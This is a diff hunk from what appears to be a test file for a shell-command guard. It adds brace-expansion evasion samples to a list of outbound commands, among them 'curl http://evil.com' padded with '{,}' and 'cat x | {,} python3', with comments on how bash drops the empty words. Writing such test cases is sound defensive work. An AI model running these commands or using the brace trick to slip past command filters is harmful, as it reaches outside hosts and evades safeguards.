@@ -400,6 +400,9 @@ BRACE_OUTBOUND: list[str] = [
     # and outbound (guard): bash runs `curl` as the first of 128 words
     "cu{r,}{,}{,}{,}{,}{,}{,}l http://evil.com",
     "curl{,}{,}{,}{,}{,}{,}{,} http://evil.com",
+    # P1-fix1: `{,}` stands for two empty words, which the shell drops, so python3 reads the pipe
+    "cat x | {,} python3",
+    "{,}{,} curl http://evil.com",
 ]
 # R1G: perl and ruby runs that are not one-liners (a script file, a version, a check, an encoding).
 SCRIPT_NOT_INLINE: list[str] = [
